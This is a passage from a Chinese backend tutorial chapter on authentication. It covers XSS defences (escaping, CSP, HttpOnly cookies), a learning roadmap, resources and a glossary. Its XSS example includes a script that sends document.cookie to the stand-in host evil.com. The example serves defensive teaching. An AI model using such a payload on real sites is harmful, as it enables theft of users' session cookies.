+<p><strong>攻击场景</strong>：
+恶意用户在评论区输入：</p>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-html">&lt;script&gt;
+  fetch(&#39;https://evil.com/steal?cookie=&#39; + document.cookie)
+&lt;/script&gt;
+</code></pre>
+<p>如果网站直接渲染这段内容，其他用户的 Cookie 就会被盗走。</p>
+<p><strong>防御措施</strong>：</p>
+<ol>
+<li><strong>输出转义</strong>：<ul>
+<li>把 <code>&lt;</code> 转成 <code>&amp;lt;</code>，<code>&gt;</code> 转成 <code>&amp;gt;</code>。</li>
+</ul>
+</li>
+</ol>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python">import html
+
+def render_comment(comment):
+    # 转义 HTML
+    safe_comment = html.escape(comment)
+    return f&quot;&lt;div class=&#39;comment&#39;&gt;{safe_comment}&lt;/div&gt;&quot;
+</code></pre>
+<ol start="2">
+<li><strong>Content Security Policy (CSP)</strong>：<ul>
+<li>设置 HTTP 头，限制脚本来源。</li>
+</ul>
+</li>
+</ol>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-http">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39; https://cdn.example.com
+</code></pre>
+<ol start="3">
+<li><strong>HttpOnly Cookie</strong>：<ul>
+<li>设置 Cookie 的 <code>HttpOnly</code> 属性，JavaScript 无法读取。</li>
+</ul>
+</li>
+</ol>
+<pre tabindex="0" role="region" aria-label="代码或文本，可横向滚动"><code class="language-python">app.config.update(
+    SESSION_COOKIE_HTTPONLY=True
+)
+</code></pre>
+<h3 id="6-总结与学习路线">6. 总结与学习路线</h3>
+<p>鉴权是后端系统的&quot;基本功&quot;，掌握了它才能构建安全可靠的应用。</p>
+<h4 id="61-核心知识点">6.1 核心知识点</h4>
+<div class="table-scroll" tabindex="0" role="region" aria-label="表格，可横向滚动"><table>
+<thead>
+<tr>
+<th align="left">知识点</th>
+<th align="left">重要程度</th>
+<th align="left">难度</th>
+<th align="left">实战频率</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Session + Cookie</strong></td>
+<td align="left">⭐⭐⭐⭐</td>
+<td align="left">中</td>
+<td align="left">高</td>
+</tr>
+<tr>
+<td align="left"><strong>JWT</strong></td>
+<td align="left">⭐⭐⭐⭐⭐</td>
+<td align="left">低</td>
+<td align="left">极高</td>
+</tr>
+<tr>
+<td align="left"><strong>OAuth 2.0</strong></td>
+<td align="left">⭐⭐⭐⭐</td>
+<td align="left">高</td>
+<td align="left">高</td>
+</tr>
+<tr>
+<td align="left"><strong>密码哈希 (bcrypt)</strong></td>
+<td align="left">⭐⭐⭐⭐⭐</td>
+<td align="left">低</td>
+<td align="left">极高</td>
+</tr>
+<tr>
+<td align="left"><strong>限流与防暴力破解</strong></td>
+<td align="left">⭐⭐⭐⭐⭐</td>
+<td align="left">中</td>
+<td align="left">极高</td>
+</tr>
+<tr>
+<td align="left"><strong>CSRF 防御</strong></td>
+<td align="left">⭐⭐⭐⭐</td>
+<td align="left">中</td>
+<td align="left">中</td>
+</tr>
+<tr>
+<td align="left"><strong>XSS 防御</strong></td>
+<td align="left">⭐⭐⭐⭐</td>
+<td align="left">低</td>
+<td align="left">高</td>
+</tr>
+</tbody></table></div>
+<h4 id="62-学习路线">6.2 学习路线</h4>
+<ol>
+<li><p><strong>入门</strong>（1-2 天）：</p>
+<ul>
+<li>理解认证 vs 授权。</li>
+<li>掌握 Session + Cookie 的原理。</li>
+<li>实现一个简单的登录注册功能。</li>
+</ul>
+</li>
+<li><p><strong>进阶</strong>（1 周）：</p>
+<ul>
+<li>学习 JWT 的原理和实现。</li>
+<li>实现基于 JWT 的鉴权系统。</li>
+<li>掌握密码哈希（bcrypt）。</li>
+</ul>
+</li>
+<li><p><strong>实战</strong>（2-4 周）：</p>
+<ul>
+<li>集成 OAuth 2.0（微信、Google 登录）。</li>
+<li>实现限流、防暴力破解。</li>
+<li>防御 CSRF、XSS 等常见攻击。</li>
+</ul>
+</li>
+<li><p><strong>深入</strong>（持续）：</p>
+<ul>
+<li>学习 RBAC（基于角色的访问控制）。</li>
+<li>研究 SSO（单点登录）。</li>
+<li>探索 Zero Trust Architecture（零信任架构）。</li>
+</ul>
+</li>
+</ol>
+<h4 id="63-推荐资源">6.3 推荐资源</h4>
+<ul>
+<li><strong>标准</strong>：<ul>
+<li>RFC 6749 (OAuth 2.0)</li>
+<li>RFC 7519 (JWT)</li>
+</ul>
+</li>
+<li><strong>文章</strong>：<ul>
+<li>JWT.io: <a href="https://jwt.io/">https://jwt.io/</a></li>
+<li>OAuth 2.0 简体中文版: <a href="https://oauth.net/2/">https://oauth.net/2/</a></li>
+</ul>
+</li>
+<li><strong>工具</strong>：<ul>
+<li>jwt.io (JWT 在线调试)</li>
+<li>Postman (API 测试)</li>
+</ul>
+</li>
+</ul>
+<h3 id="7-名词速查表-glossary-1">7. 名词速查表 (Glossary)</h3>
+<div class="table-scroll" tabindex="0" role="region" aria-label="表格，可横向滚动"><table>
+<thead>
+<tr>
+<th align="left">名词</th>
+<th align="left">全称</th>
+<th align="left">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>AuthN</strong></td>
+<td align="left">Authentication</td>
+<td align="left"><strong>认证</strong>。确认&quot;你是谁&quot;（如输入密码验证身份）。</td>
+</tr>
+<tr>
+<td align="left"><strong>AuthZ</strong></td>
+<td align="left">Authorization</td>
+<td align="left"><strong>授权</strong>。确认&quot;你能干什么&quot;（如管理员才能删除）。</td>
+</tr>
+<tr>
+<td align="left"><strong>Session</strong></td>
+<td align="left">-</td>
+<td align="left"><strong>会话</strong>。服务端存储的用户状态信息。</td>
+</tr>
+<tr>
+<td align="left"><strong>Cookie</strong></td>
+<td align="left">-</td>
+<td align="left"><strong>小甜饼</strong>。浏览器存储的小段数据，每次请求都会自动带上。</td>
+</tr>
+<tr>
+<td align="left"><strong>JWT</strong></td>
+<td align="left">JSON Web Token</td>
+<td align="left"><strong>JSON Web 令牌</strong>。一种无状态的认证方案，包含 Header、Payload、Signature 三部分。</td>
+</tr>
+<tr>
+<td align="left"><strong>OAuth 2.0</strong></td>
+<td align="left">-</td>
+<td align="left"><strong>开放授权</strong>。第三方登录的标准化框架（如&quot;用微信登录&quot;）。</td>
+</tr>
+<tr>
+<td align="left"><strong>SSO</strong></td>
+<td align="left">Single Sign-On</td>
+<td align="left"><strong>单点登录</strong>。登录一次，就可以访问多个应用（如 Google 账号登录所有 Google 服务）。</td>
+</tr>
+<tr>
+<td align="left"><strong>RBAC</strong></td>
+<td align="left">Role-Based Access Control</td>
+<td align="left"><strong>基于角色的访问控制</strong>。根据用户的角色（如 admin、user）决定权限。</td>
+</tr>
+<tr>
+<td align="left"><strong>CSRF</strong></td>
+<td align="left">Cross-Site Request Forgery</td>
+<td align="left"><strong>跨站请求伪造</strong>。攻击者诱导用户发送恶意请求（如用你的 Cookie 发起转账）。</td>
+</tr>
+<tr>
+<td align="left"><strong>XSS</strong></td>
+<td align="left">Cross-Site Scripting</td>
+<td align="left"><strong>跨站脚本攻击</strong>。攻击者在网页注入恶意脚本（如盗取 Cookie）。</td>
+</tr>
+<tr>
+<td align="left"><strong>bcrypt</strong></td>
+<td align="left">-</td>
+<td align="left"><strong>密码哈希算法</strong>。一种慢哈希算法，专门用于密码存储，防暴力破解。</td>
+</tr>
+<tr>
+<td align="left"><strong>Access Token</strong></td>
+<td align="left">-</td>
+<td align="left"><strong>访问令牌</strong>。短期有效的令牌，用于访问 API。</td>
+</tr>
+<tr>
+<td align="left"><strong>Refresh Token</strong></td>
+<td align="left">-</td>
+<td align="left"><strong>刷新令牌</strong>。长期有效的令牌，用于获取新的 Access Token。</td>
+</tr>
+<tr>
+<td align="left"><strong>Scope</strong></td>
+<td align="left">-</td>
+<td align="left"><strong>权限范围</strong>。OAuth 2.0 中的概念，表示第三方应用请求的权限（如读取用户信息）。</td>
+</tr>
+<tr>
+<td align="left"><strong>PKCE</strong></td>
+<td align="left">Proof Key for Code Exchange</td>
+<td align="left"><strong>授权码交换的证明密钥</strong>。OAuth 2.0 的扩展，用于公共客户端（如 SPA）的安全增强。</td>
+</tr>
+</tbody></table></div>
+<hr>
+</article><nav class="paging" aria-label="章节导航"><a rel="prev" href="chapter-122.html">← 序列化与数据格式</a><a rel="next" href="chapter-124.html">并发、异步与多线程 →</a></nav></main>
+<footer><a href="../../book/book.md">原书 Markdown</a> · <a href="https://github.com/datawhalechina/easy-vibe">原课程与网页交互示例</a></footer></body></html>
